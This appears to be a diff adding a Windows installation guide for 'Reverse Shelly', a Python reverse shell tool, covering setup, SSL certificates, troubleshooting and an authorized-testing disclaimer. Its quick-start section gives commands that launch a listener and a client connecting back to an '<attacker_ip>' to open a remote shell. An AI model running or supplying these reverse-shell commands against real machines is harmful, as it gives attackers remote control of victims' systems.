@@ -1,0 +1,37 @@
+Reverse Shelly — Windows Installation Guide
+============================================
+
+1. PREREQUISITES
+   - Python 3.7 or higher (Python 3.8+ recommended)
+   - pip (comes with Python)
+   - Internet connection for downloading packages
+
+2. INSTALL PYTHON (if not already installed)
+   - Download from https://www.python.org/downloads/
+   - During installation, CHECK "Add Python to PATH"
+   - Verify: open Command Prompt and run: python --version
+
+3. INSTALL DEPENDENCIES
+   - Open Command Prompt in the project folder
+   - Run: pip install -r requirements.txt
+   - Wait for all packages to install
+
+4. SSL CERTIFICATES (optional)
+   - The listener can auto-generate certificates on first run
+   - Or generate manually: see Reverse Shelly\ssl_setup_readme.md
+   - server.key is never committed — generate locally
+
+5. QUICK START
+   - Listener: Run run_listener.bat (or: cd "Reverse Shelly" && python reverse_shell_listener.py <ip> <port>)
+   - Client: Run run_client.bat (or: cd "Reverse Shelly" && python reverse_shell_client.py <attacker_ip> <port>)
+
+6. TROUBLESHOOTING
+   - "python not found": Add Python to PATH or use full path (e.g. C:\Python311\python.exe)
+   - "Module not found": Run pip install -r requirements.txt again
+   - "pywin32" errors: Run: pip install --upgrade pywin32
+   - Firewall: Allow Python through Windows Firewall if connection fails
+
+7. SECURITY
+   - Change SHARED_SECRET in both listener and client before real use
+   - Use only for authorized penetration testing and educational purposes
+   - Never use on systems without explicit permission
